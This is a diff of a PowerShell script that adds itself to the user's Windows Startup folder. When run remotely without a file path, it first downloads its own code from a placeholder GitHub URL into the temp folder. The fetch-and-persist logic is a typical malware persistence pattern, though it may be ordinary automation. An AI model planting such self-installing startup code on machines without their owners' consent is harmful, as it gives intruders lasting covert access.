@@ -1,11 +1,23 @@
-# Get the path to the startup folder
+# Get the script's full path (alternative method for remote execution)
+if ($MyInvocation.MyCommand.Path) {
+    $ScriptPath = $MyInvocation.MyCommand.Path
+} else {
+    $ScriptPath = $PSCommandPath
+}
+
+# Ensure the script is running from a file, otherwise download itself
+if (-not $ScriptPath) {
+    $ScriptPath = "$env:TEMP\startup.ps1"
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/USERNAME/REPO/main/startup.ps1" -OutFile $ScriptPath
+}
+
+# Get the startup folder path
 $StartupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
 
-# Get the script's full path
-$ScriptPath = $MyInvocation.MyCommand.Path
-
-# Define the destination path in the startup folder
-$StartupScriptPath = [System.IO.Path]::Combine($StartupFolder, [System.IO.Path]::GetFileName($ScriptPath))
+# Define the destination path
+$StartupScriptPath = [System.IO.Path]::Combine($StartupFolder, "startup.ps1")
 
 # Copy the script to the startup folder
 Copy-Item -Path $ScriptPath -Destination $StartupScriptPath -Force
+
+Write-Host "Script added to startup: $StartupScriptPath"
